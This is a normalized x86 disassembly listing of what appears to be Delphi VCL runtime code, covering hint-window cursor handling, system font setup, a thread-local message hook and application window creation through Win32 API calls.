mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
sub_422dc0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x38 ]
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x3c ]
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] ax
cmp [ ebp - 0x6 ] 0x0
jne r-xdata
movsx edx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_422d64
push eax
call SetCursor
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
call WindowFromPoint
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x14 ]
push eax
call GetWindowThreadProcessId
mov ebx eax
call GetCurrentThreadId
cmp ebx eax
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_444558
push eax
push 0x0
push 0x84
mov eax [ ebp - 0x14 ]
push eax
call SendMessageA
mov [ ebp - 0x18 ] eax
mov dx 0x200
mov ax [ ebp - 0x18 ]
call sub_44447c
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x20
mov eax [ ebp - 0x14 ]
push eax
call SendMessageA
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_422e7c
push ebp
mov ebp esp
add esp 0xfffffe6c
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x40 ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
call sub_40ebdc
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
call sub_40ebdc
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_40ed00
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_40ebdc
lea eax [ ebp - 0xb8 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_40ebdc
lea eax [ ebp - 0xf4 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_40ebdc
jmp r-xdata
mov [ ebp - 0x194 ] 0x154
push 0x0
lea eax [ ebp - 0x194 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
sub_422f58
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
dec [ eax + 0x80 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x82 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_422f90
sub_422fa4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xa ] 0x0
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x34 ]
setg [ ebp - 0xa ]
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0xa ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
add eax [ edx + 0x3c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x3c ]
cmp eax edx
setl [ ebp - 0xa ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
setg [ ebp - 0xa ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
add eax [ edx + 0x38 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x38 ]
cmp eax edx
setl [ ebp - 0xa ]
jmp r-xdata
sub_423038
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x2
jne r-xdata
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x10 ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x5 ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
sub [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
cmp eax [ ebp - 0x18 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4231a7 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0x8 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_423238
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42282c
dec eax
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x4b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_43c464
mov dl [ ebp - 0x1 ]
call sub_423038
pop ecx
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_422808
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x4b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x213 ] 0x1
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x213 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43c264
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp eax [ ebp - 0x10 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_43c550
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebp - 0x10 ]
call sub_422fa4
pop ecx
test al al
je r-xdata
inc [ ebp - 0xc ]
sub_4233b4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42282c
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0x8 ] eax
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_422808
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4b ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x213 ] 0x1
jne r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_423428
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_4233b4
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4234a2
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_423238
pop ecx
push ebp
mov al 0x2
call sub_423238
pop ecx
push ebp
mov al 0x3
call sub_423238
pop ecx
push ebp
mov al 0x4
call sub_423238
pop ecx
push ebp
mov al 0x5
call sub_423238
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_44c070
retn
sub_4234b0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_422f44
xor eax eax
push ebp
push sub_42352a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423428
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x82 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_422f58
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x82 ] 0x10
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_423550
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_44cae0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x70 ]
call sub_44cb34
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_423598
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x89 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
sub_4235e0
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_423611
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_425d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_423634
push ebp
mov ebp esp
add esp 0xfffffff8
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_42ac20
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_425dc0
sub_423694
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ rw-data ]
call sub_424d70
sub_4236d8
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp [ eax + 0x95 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_423694
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push sub_423634
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_423754
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_4237b0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] 0x8
push 0x0
lea eax [ ebp - 0x9 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
mov [ ebp - 0x1 ] 0x0
cmp [ ebp - 0x5 ] 0x0
setne [ ebp - 0x1 ]
jmp r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_4237e8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x1 ] al
mov [ ebp - 0x9 ] 0x8
mov al [ ebp - 0x1 ]
neg al
sbb eax eax
mov [ ebp - 0x5 ] eax
push 0x0
lea eax [ ebp - 0x9 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
mov esp ebp
pop ebp
retn
sub_423818
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call sub_4237b0
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ShowWindow
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
call sub_4237e8
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_4237e8
sub_423868
push ebp
mov ebp esp
add esp 0xfffffef0
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x80 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x98 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x50 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x74 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4c ] 0x80000018
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x6c ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x70 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x64 ] 0x9c4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8d ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4165cc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x88 ] eax
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
call sub_416a8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_425958
push 0x100
lea eax [ ebp - 0x110 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call OemToCharA
lea eax [ ebp - 0x110 ]
mov dl 0x5c
call sub_4486ec
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
lea eax [ ebp - 0x110 ]
mov dl 0x2e
call sub_44873c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
inc edx
lea eax [ ebp - 0x110 ]
call sub_446838
lea eax [ ebp - 0x110 ]
inc eax
push eax
call CharLowerA
mov eax [ ebp - 0x4 ]
add eax 0x7c
lea edx [ ebp - 0x110 ]
mov ecx 0x100
call sub_44cd10
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4a ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4b ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8e ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x90 ] edx
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_423b7c
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_423a55
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x20
jbe r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
call FreeLibrary
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8d ] 0x0
mov eax [ ebp - 0x4 ]
call sub_425dc0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425660
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
mov eax [ ebp - 0x4 ]
push eax
push sub_424048
mov eax [ ebp - 0x4 ]
call sub_424f98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
call sub_44c070
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a4f4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor ecx ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_425638
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SendMessageA
sub_423b7c
push ebp
mov ebp esp
add esp 0xffffffcc
xor edx edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423d3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d44
lea eax [ ebp - 0x34 ]
call sub_44cae0
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_42413c
call sub_41a414
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_44cf24
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_444580
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x7c
call sub_44cae0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call GetSystemMenu
mov [ ebp - 0x8 ] eax
push 0x0
push 0xf030
mov eax [ ebp - 0x8 ]
push eax
call DeleteMenu
push 0x0
push 0xf000
mov eax [ ebp - 0x8 ]
push eax
